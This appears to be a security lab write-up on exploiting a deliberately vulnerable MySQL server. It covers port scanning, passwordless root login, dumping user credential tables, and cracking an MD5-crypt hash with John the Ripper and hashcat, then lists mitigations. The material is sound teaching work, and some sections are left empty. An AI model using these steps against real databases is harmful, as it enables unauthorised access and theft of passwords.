# Cryptographic Attacks - Cracking Weak Password Hashes & Exploiting Poor Authentication in Databases

---

<br/> <br/>

## Objectives

1. Identify and exploit cryptographic weaknesses in database authentication.
2. Perform offline hash cracking on discovered password hashes.
3. Investigate real-world cryptographic failures.
4. Propose secure cryptographic solutions.

---

 <br/>

## Tools Used

| Tool        | Use                               |
| ----------- | --------------------------------- |
| `OpenSSL`   | Check for Encryption              |
| `nmap`      | Port scanning & service detection |
| `nc`        | Quick port scan                   |
| `mysql`     | Access and enumeration            |
| `hashid`    | Identify hash types               |
| `john`      | Cracking password hashes          |
| `hashcat`   | GPU-based hash cracking           |
| `Wireshark` | Network traffic analysis          |

<br/>

## Lab Setup </br>

- **Attacker Machine**: Kali Linux
- **Target**: Vulnerable machine running an exposed database service</br></br>

---

## Task 1: Service Enumeration and Initial Access

### 1.1 Finding the Target IP

```bash
netdiscover
```

- Scans your local subnet for live devices.
- Helps you find IPs and MAC addresses </br> </br> </br>

```bash
nmap -sS -sV -p- <Target IP>
```

- `-sS`: SYN scan (stealthy)
- `-sV`: Service version detection
- `-p-`: Scan all 65535 TCP ports

Discovered port **3306** open → MySQL service detected.

#### Alternative

```bash
nc -zv <Target IP>
```

- `-z`: Scan without sending data
- `-v`: Verbose output

Not stealthy (full TCP handshake), better for basic connectivity check.

<br/>

### 1.2 Connection Attempt

```bash
mysql -h <Target IP> -u root
```

- No password prompt = potential misconfiguration.

<br/>

### 1.3 OpenSSL Check for Encryption

```bash
openssl s_client -connect <target IP>:3306 -quiet
```

- `openssl` : The OpenSSL command-line tool for cryptographic operations
- `s_client` : A subcommand used to act as an SSL/TLS client and connect to a remote server
- `-connect <target IP>:3306` : Specifies the target IP and port to test (here, port 3306 for MySQL).

#### Optional

- `-quiet` : Suppresses verbose output (e.g., certificate details), showing only critical errors or success messages.

### Results

It tests whether the target service (e.g., MySQL) supports SSL/TLS encryption on port 3306.

- If SSL/TLS is **enabled and configured**, you’ll see a **successful SSL handshake** and _certificate details_.

- If SSL/TLS is **not supported**, you’ll get an **error** (e.g., no peer certificate available or SSL3_GET_RECORD: wrong version number).

<br/> <br/>

### Problem Encountered

---

<br/> <br/>

## Task 2: Enumeration of Users and Authentication Weakness

### Enumeration

```sql
SELECT user, host, authentication_string FROM mysql.user;
```

### Findings

### Access Attempt

```bash
mysql -h <Target IP> -u admin
```

### Question: Is no password a cryptographic failure?

**Yes.** It completely bypasses cryptographic authentication. A secure system must require password hashing + proper access control.

---

<br/>

## Task 3: Password Hash Discovery and Hash Identification

Now that we're in the database, Lets start digging

### 3.1 Locate Hash Table

```sql
USE users_db;
SELECT * FROM credentials;
```

Extracted hashes:

```text
$1$eGczHgEg$3gqZB9kPEyoq5QNEa74mv/
```

### 3.1 Identify Hash

```bash
hashid '$1$eGczHgEg$3gqZB9kPEyoq5QNEa74mv/'
```

- Result: **MD5 Crypt**
- Weak due to collision resistance and speed (fast to brute-force)

---

<br/>

## Task 4: Offline Hash Cracking

### 4.1 Using John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

- Cracked password: `admin123`

### 4.2 Using Hashcat (alternative)

```bash
hashcat -m 500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

- `-m 500`: MD5 Crypt
- `-a 0`: Dictionary attack

### 4.3 Password Strength

- Low entropy, common word found in `rockyou.txt` = insecure.

---

## Task 5: Cryptographic Analysis and Mitigation

### Issues Found

- No password on some accounts
- Weak password hashes (MD5 Crypt)
- Potential plaintext transmission

### Solutions

- Enforce strong password policy
- Use secure hash functions (e.g., bcrypt, Argon2)
- Enable SSL/TLS for database communication

### Optional Wireshark Analysis

Captured MySQL login traffic → No SSL → Username and hashed password transmitted in plaintext.

---

---

## Conclusion

This lab showed how poor cryptographic practices (empty passwords, weak hashes, no SSL) can easily be exploited. Stronger authentication, hashing, and encrypted communication are essential to secure systems.

---

---
